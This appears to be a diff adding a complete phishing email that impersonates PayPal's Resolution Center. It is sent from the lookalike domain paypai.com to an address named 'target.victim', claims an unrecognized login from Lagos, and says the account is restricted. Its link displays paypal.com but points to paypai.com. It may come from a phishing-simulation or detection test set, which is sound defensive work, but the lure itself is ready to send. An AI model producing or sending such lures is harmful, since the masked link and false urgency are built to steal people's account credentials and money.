@@ -1,0 +1,23 @@
+From: "PayPal Resolution Center" <service@paypai.com>
+To: target.victim@enterprise.com
+Subject: Account Limitation Alert: Unrecognized Device Detected
+Date: Wed, 29 Oct 2026 15:45:00 +0500
+Message-ID: <paypal-limitation-6610@paypai.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>PayPal Security Center</h2>
+  <p>Dear Member,</p>
+  <p>We detected a new login to your PayPal account from an unrecognized Linux system in Lagos, Nigeria.</p>
+  <p>To protect your balance, your account has been placed under temporary restriction. You cannot transfer funds or pay invoices until you confirm your identity.</p>
+  <p>
+    Please restore your account below:
+    <br/>
+    <a href="http://paypai.com/auth/restore-session">https://www.paypal.com/security-restore</a>
+  </p>
+  <p>Thank you for helping us maintain a safe platform.<br/>PayPal Support Team</p>
+</body>
+</html>
